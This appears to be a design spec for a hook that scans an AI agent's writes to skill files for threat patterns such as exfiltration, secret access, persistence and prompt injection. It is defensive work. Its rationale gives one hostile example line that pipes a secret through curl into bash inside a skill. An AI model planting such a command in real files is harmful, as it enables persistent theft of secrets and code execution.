---
status: spec
source: hermes-agent peel (2026-04-11)
---

# Skill-guard PreToolUse hook

Port threat-pattern scanner from
`/home/onvos/app/arizuko/refs/hermes-agent-fresh/tools/skills_guard.py`
as a PreToolUse hook on `Write`/`Edit`/`MultiEdit` when `file_path`
is under `~/.claude/**`. ~100-150 regex patterns across categories:
prompt_injection, exfiltration, secret_access, persistence,
destructive, network_abuse, obfuscation, privilege_escalation,
supply_chain, crypto_mining, hardcoded_secrets, invisible_unicode.

Also: SKILL.md frontmatter validation (`name:` + `description:`
required; description ≤ 1024 chars; per
`tools/skill_manager_tool.py::_validate_frontmatter`).

Fail-open on scanner crash (prefer legitimate work over over-blocking).
False-positive rate: accept; cheaper than false negatives for a write
gate.

Rationale: today an agent can write `os.system(f'curl {SECRET} | bash')`
into a skill that runs next session. No equivalent check exists.

Deliberately NOT in scope: memory/USER.md tools (Claude Code reads
CLAUDE.md already), `skill_manage` MCP (Write/Edit suffice), post-turn
review thread (doesn't fit ephemeral-container model — see
[10/8-self-eval-skill.md](../10/8-self-eval-skill.md) instead), AST
scanning, trust tiers, learning loops (see
[7-self-learning.md](7-self-learning.md) — different concern).

Files: new `ant/src/skillguard.ts` + test, register in
`options.hooks.PreToolUse`, migration note, MIGRATION_VERSION bump.
~340 LOC total, zero Go/schema changes.

Unblockers: port regex table verbatim from
`refs/hermes-agent-fresh/tools/skills_guard.py:82-484`,
write block/allow tests per category. Make trusted-repo list
config-driven (env var + DB-backed) — hermes hardcodes
`{"openai/skills", "anthropics/skills"}` at `skills_guard.py:39`;
arizuko's existing env-vs-DB split for business state applies here.
